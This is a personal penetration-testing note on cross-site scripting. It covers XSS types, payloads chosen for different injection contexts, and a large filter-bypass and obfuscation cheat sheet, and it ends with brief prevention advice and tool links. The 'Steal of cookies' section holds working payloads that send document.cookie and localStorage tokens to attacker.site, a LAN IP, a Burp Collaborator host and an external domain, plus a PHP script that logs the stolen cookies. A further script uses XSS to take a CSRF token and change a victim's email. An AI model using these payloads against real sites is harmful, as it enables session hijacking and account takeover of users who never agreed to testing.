---
aliases: [XSS]
---
>[!abstract]
>It is a vulnerability caused by the **insertion of the user's input inside the web page without that it hash been sanitized**.
>Dangerous special characters are: `< > ' " { } ;`

Different types of XSS:

- **Reflected**: The attack is only temporary for the request made. The vulnerable field is reflected via a parameter within the URL

- **Stored**: XSS attack saves malicious content along with normal content on DB, so that every time that content is loaded, the attack is also executed (typical of blogs)

- **[DOM-based XSS](DOM-based%20vulnerabilities.md#DOM-based%20XSS)**: It occurs when the payload is executed by modifying the DOM (Document Object Model), thus allowing the modification of HTML and XML components. In this case the responsible for the vulnerability is the client language and not the server (as for the other two). It manifests itself when the dynamic page is programmed in JavaScript, so that server-side requests are not executed, and the data present on the screen depends on other data entered by hand or derived from query-strings. DOM based XSS can be both reflected as well as stored, and they usually derive from `eval()` or `innerHTML`.

- **Self XSS**: Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser.

- [Blind XSS](../../Readwise/Articles/novasecio%20-%20Hunting%20for%20Blind%20XSS%20Vulnerabilities%20A%20Complete%20Guide.md): Blind XSS vulnerabilities are quite different as the reflection happens on a component that's not accessible to the attacker (for example, an internal-only administrative panel, or a support dashboard accessible by the helpdesk employees only).

- [mXSS](../../Readwise/Articles/sonarsource.com%20-%20mXSS%20The%20Vulnerability%20Hiding%20in%20Your%20Code.md): The M in mXSS stands for [Mutation](../Dev,%20scripting%20&%20OS/HTML.md#Mutation). mXSS takes advantage of this behavior in order to bypass sanitization.

Possible attacks and risks:

- Theft of cookies and session tokens
- User Enumeration and Fingerprinting
- Redirecting to malicious sites or contents
- Keylogging
- Automation of actions

# Warning when choosing the right PoC

>[!warning]
>From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling `alert()`. As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the `print()` function. Further references at [alert() is dead, long live print()](https://portswigger.net/research/alert-is-dead-long-live-print) 

---

# Examples of attacks

>[!summary] Remember
>A key task is to always identify the XSS context:
>- The location within the response where attacker-controllable data appears.
>- Any input validation or other processing that is being performed on that data by the application.
>
> Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

Example of different context and respective useful payloads:
- XSS between HTML tags 
	- `<script>alert(document.domain)</script>`
	- `<img src=1 onerror=alert(1)>`
- XSS in HTML tag attributes
	- `"><script>alert(document.domain)</script>`
	- `" autofocus onfocus=alert(document.domain) x="` 
	- `<a href="javascript:alert(document.domain)">`
	- [XSS in hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields) ---> `%27accesskey=%27x%27onclick=%27alert(1)`
- XSS into JavaScript
	- `</script><img src=1 onerror=alert(document.domain)>`
	- `'-alert(document.domain)-'` or `';alert(document.domain)//`
- Making use of HTML-encoding
	- `&apos;-alert(document.domain)-&apos;`
- XSS in JavaScript template literals (eg. ``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``)
	- `${alert(document.domain)}`
- [Client-side template injection (CSTI)](Client-side%20template%20injection%20(CSTI).md)
	- [Client-side template injection in AngularJS](Client-side%20template%20injection%20(CSTI).md#Client-side%20template%20injection%20in%20AngularJS)
- [Cross-Site Scripting using MIME sniffing (MIME Confusion)](MIME%20sniffing.md#Cross-Site%20Scripting%20using%20MIME%20sniffing%20(MIME%20Confusion))
## Steal of cookies and session tokens

Payload:

```html
<script> new Image().src = "http://attacker.site/log.php?q="+document.cookie;</script>

<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.0.18:8888/?"+document.cookie;
</script>

<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>

<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>

<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">

<img src onerror=fetch("https://0xbro.red/?token="+localStorage.token)>

<svg/onload=import('//burpcollaborator')>
```

Server:

```php
<?php
$filename = "/tmp/log.txt";
$fp = fopen($filename, 'a');

$cookie = $_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

## iframe redirection

Payload:

```jsx
<iframe src="192.168.1.55/malicious.js" height="0" width="0"></iframe>
```


## Exploiting XSS to perform CSRF

>[!tip]
>See also [Cross-Site Request Forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md)

The payload first extract the CSRF token from the "change email" function, then perform the CSRF attack:
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Other references:
- GIS3W: [Persistent XSS in G3WSuite 3.5](https://labs.yarix.com/2023/07/gis3w-persistent-xss-in-g3wsuite-3-5-cve-2023-29998/) – CVE-2023-29998
- [AtMail XSS to RCE](https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail)
- [Chaining XSS, CSRF to achieve RCE](https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/)

## Transform Self-XSS into full-exploitable XSS

- [Turning unexploitable XSS into an account takeover with Matan Berson](https://www.youtube.com/watch?v=_VGEtJSRkjg&list=WL&index=2&ab_channel=BugBountyReportsExplained); Bug Bounty Reports Explained
- Self-XSS in Cookies + [Cookie Tossing](Cookie%20Tossing.md) [^zoom-ato]

[^zoom-ato]: [Zoom Session Takeover - Cookie Tossing Payloads, OAuth Dirty Dancing, Browser Permissions Hijacking, and WAF Abuse](../../Readwise/Articles/Harel%20Security%20Research%20-%20Zoom%20Session%20Takeover%20-%20Cookie%20Tossing%20Payloads,%20OAuth%20Dirty%20Dancing,%20Browser%20Permissions%20Hijacking,%20and%20WAF%20Abuse.md), Harel Security Research - 


## XSS interesting cases and chains

- [Hacking Swagger-Ui - From XSS to Account Takeovers](../../Readwise/Articles/Dawid%20Moczadło%20-%20Hacking%20Swagger-Ui%20-%20From%20XSS%20to%20Account%20Takeovers.md)
- Bypass the [HttpOnly Cookie Attribute](HttpOnly%20Cookie%20Attribute.md) protection with [XSS + phpinfo](HttpOnly%20Cookie%20Attribute.md#XSS%20+%20phpinfo)
- XSS on a subdomain for attacking parent domains with [Cookie Tossing](Cookie%20Tossing.md) and [Cookie Eviction](Cookie%20Eviction.md)
- XSS exploiting [Encoding Differentials](../../Readwise/Articles/sonarsource.com%20-%20Encoding%20Differentials%20Why%20Charset%20Matters.md)

---

# XSS cheat sheets & filtering bypass

```html
<script>alert("Hacked!")</script>                                   <!-- Classic payload -->  
<ScRiPt>alert("Hacked!")</ScRiPt>                                   <!-- Case insensitive bypass -->
<sc<script>ript>alert("XSS");</scr</script>ipt>                     <!-- word control bypass -->
<script type="text/javascript">alert(document.cookie)</script>      <!-- legacy syntax bypass -->
<svg onload="alert(document.cookie)">                               <!-- JS from HTML bypass -->
<img src=x onerror=alert(1337)>                                     <!-- JS on error when loading a non existing image -->
<script/junk>alert(1)</script>                                      <!-- random junk after the tag -->
<a href="javascript:alert(1)">show</a>                              <!-- XSS using <a href> tag -->

<!-- Obfuscation -->
<img src=x onerror="&#x61;lert(1)">                                 <!-- Obfuscation via HTML encoding -->
<a href="javascript&#00000000000058;alert(1)">Click me</a>          <!-- Obfuscation via leading zeros in HTML encodings (deciaml and hex) -->
<a href="javascript:\u0061lert(1)">Click me</a>                     <!-- Obfuscation via Unicode encoding -->
<a href="javascript:\u{0000000003a}alert(1)">Click me</a>           <!-- Obfuscation via leading zeros in unicode encoding -->
<a href="javascript:\x61lert">Click me</a>                          <!-- Obfuscation via HEX encoding -->
<a href="javascript:\141lert">Click me</a>                          <!-- Obfuscation via Octal encoding -->
<a href="javascript:&bsol;u0061lert(1)">Click me</a>                <!-- Obfuscation via multiple layer of encodings (HTML, Unicode) -->
<a href="data:;base64;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>  <!-- XSS using <a href> tag and base64 payload-->

<!-- XSS without parentheses and semi-colons -->
onerror=alert;throw 1                                               
postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

<!-- XSS without script tags and spaces -->
<image/src/onerror=prompt(9)>

<!-- Using SVG to bypass href filtering -->
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

<!-- I've been using this payload for over a year to discover XSS via open redirect vulnerabilities that bypass WAF https://twitter.com/0xM5awy/status/1704433016427229581 -->
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

<!-- polyglot XSS without script tags and spaces -->
<img/&gt;/src/onerror=prompt(1337)// 
```

See also: [All-in-one Polyglot](../../Readwise/Tweets/0x0SojalSec%20on%20Twitter%20-%20Tweets%20from%20Md%20Ismail%20Šojal%20🕷️.md#All-in-one%20Polyglot)

Extensive cheat sheets can be found at:

- [Multi-purpose snippets - JS AWAE Prep](https://mlcsec.com/posts/js-awae-prep/)
- [[Evading Restrictions.md]]
	- [mXSS](../../Readwise/Articles/sonarsource.com%20-%20mXSS%20The%20Vulnerability%20Hiding%20in%20Your%20Code.md)
	- [Flatt Security XSS Challenge - Writeup](../../Readwise/Articles/blig.one%20-%20Flatt%20Security%20XSS%20Challenge%20-%20Writeup.md#Flatt%20Security%20XSS%20Challenge%20-%20Writeup)
- [javascript-bypass-blacklists-techniques](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#javascript-bypass-blacklists-techniques)
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
- `eval(atob("base64"))`
	- [eXtra Safe Security layers](../../Play%20ground/CTFs/eXtra%20Safe%20Security%20layers.md)
	- [Mutation Lab](../../Play%20ground/CTFs/Mutation%20Lab.md)
- [Bypass CSP using MIME sniffing](MIME%20sniffing.md#Bypass%20CSP%20using%20MIME%20sniffing)
- Bypass CSP using [JSONP](JSONP%20vulnerabilities.md#JSON%20with%20Padding%20(JSONP)) as a gadget [^CSP-JSONP]
- [XSS + phpinfo](HttpOnly%20Cookie%20Attribute.md#XSS%20+%20phpinfo)
- [Rhino Security Labs - Silverpeas App Multiple CVEs Leading to File Read on Server](../../Readwise/Articles/Rhino%20Security%20Labs%20-%20Silverpeas%20App%20Multiple%20CVEs%20Leading%20to%20File%20Read%20on%20Server.md)
- [Bug Bounty Reports Explained - $25k GitHub Account Takeover & justCTF 2023 CSRF+XSS Writeup](../../Readwise/Articles/Bug%20Bounty%20Reports%20Explained%20-%20$25k%20GitHub%20Account%20Takeover%20&%20justCTF%202023%20CSRF+XSS%20Writeup.md) (parsing vs tokenization ft. html namespaces)
- [WAF-Bypass - Encoding](../../Readwise/Articles/dojo-yeswehack.com%20-%20WAF-Bypass%20-%20Encoding.md)

[^CSP-JSONP]: [Riding the Waves of API Versioning Unmasking a Stored XSS Vulnerability, CSP Bypass Using YouTube OEmbed](../../Readwise/Articles/SMHTahsin33%20-%20Riding%20the%20Waves%20of%20API%20Versioning%20Unmasking%20a%20Stored%20XSS%20Vulnerability,%20CSP%20Bypass%20Using%20YouTube%20OEmbed.md), SMHTahsin33

---

# XSS Prevention [^1]

- Filter input on arrival
- Encode data on output
- Use appropriate response headers
- [Content Security Policy (CSP)](Content%20Security%20Policy%20(CSP).md)
- [HttpOnly Cookie Attribute](HttpOnly%20Cookie%20Attribute.md)

[^1]: https://portswigger.net/web-security/cross-site-scripting/preventing

---

# Tools and methodologies for finding XXS

- BeEF
- DOM Invader
- [How to Find XSS (Cross-Site Scripting) Vulnerabilities in WordPress Plugins and Themes](../../Readwise/Articles/Alex%20Thomas%20-%20How%20to%20Find%20XSS%20(Cross-Site%20Scripting)%20Vulnerabilities%20in%20WordPress%20Plugins%20and%20Themes.md)
- [Common XSS Sources](../../Readwise/Articles/Alex%20Thomas%20-%20How%20to%20Find%20XSS%20(Cross-Site%20Scripting)%20Vulnerabilities%20in%20WordPress%20Plugins%20and%20Themes.md#Common%20XSS%20Sources)
- [Cross-Site Scripting (XSS) Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [mXSS Cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/)